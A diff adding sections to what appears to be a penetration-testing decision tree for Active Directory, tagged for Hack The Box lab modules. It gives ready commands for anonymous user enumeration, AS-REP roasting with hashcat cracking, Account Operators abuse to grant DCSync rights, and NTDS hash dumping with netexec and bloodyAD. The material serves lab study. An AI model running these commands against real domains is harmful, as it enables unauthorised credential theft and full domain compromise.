@@ -516,6 +516,82 @@ Breakdown: [[Active Directory (Breakdowns)#impacket-ntlmrelayx — full NTLM rel
 ---
 
 #### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24 #NTLMRelay #comsvcs #MiniDump #pypykatz #Defender #AVBypass #Module27
+## I have anonymous access to a domain controller, which user enumeration comes first?
+
+Run both interfaces and compare the results. RPC and LDAP can expose different users.
+
+```bash
+rpcclient -U '' -N $BoxIP -c 'enumdomusers'
+ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName
+```
+
+If a user appears in either list, include it in the AS-REP candidate list. If the service scan shows clock skew, fix the clock before Kerberos requests.
+
+## Does an account have UF_DONT_REQUIRE_PREAUTH?
+
+Yes: request an AS-REP ticket and crack it offline.
+
+```bash
+impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
+hashcat -m 18200 $LootDir/asrep.txt $Wordlist
+```
+
+Check the output file even when GetNPUsers prints no success line.
+
+## Is the foothold a member of Account Operators?
+
+Create a controlled domain user, add it to `Exchange Windows Permissions`, authenticate as the refreshed user, grant DCSync rights, and extract NTDS hashes.
+
+```bash
+netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"
+netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"
+bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
+netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
+```
+
+## Does Exchange Windows Permissions exist?
+
+Enumerate its members. If the group is absent or the add fails, return to ACL enumeration and BloodHound.
+
+```cmd
+net group "Exchange Windows Permissions" /domain
+net group "Exchange Windows Permissions" $Username2 /add /domain
+```
+
+## Did secretsdump return RemoteOperations failed or ERROR_DS_DRA_BAD_DN?
+
+Verify the ACL first. If the account has DCSync rights, try NetExec's NTDS module and use domain authentication rather than `--local-auth`.
+
+```bash
+netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
+```
+
+## Anonymous AD enumeration returned nothing
+
+If anonymous RPC, LDAP, and SMB return no useful users or shares, check HTTP for About, Team, and contact pages.
+
+```text
+Anonymous AD enumeration empty?
+        |
+        +-- Check HTTP for employee names
+                |
+                +-- Build username candidates, then test AS-REP roasting
+```
+
+## Foothold has no useful groups or privileges
+
+If `whoami /groups` and `whoami /priv` show no useful path, inspect Winlogon autologon values and validate any account against SMB, WinRM, and LDAP.
+
+```text
+No useful groups or privileges?
+        |
+        +-- Query Winlogon
+                |
+                +-- Validate the candidate account
+                        |
+                        +-- Check direct replication rights before longer ACL chains
+```
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
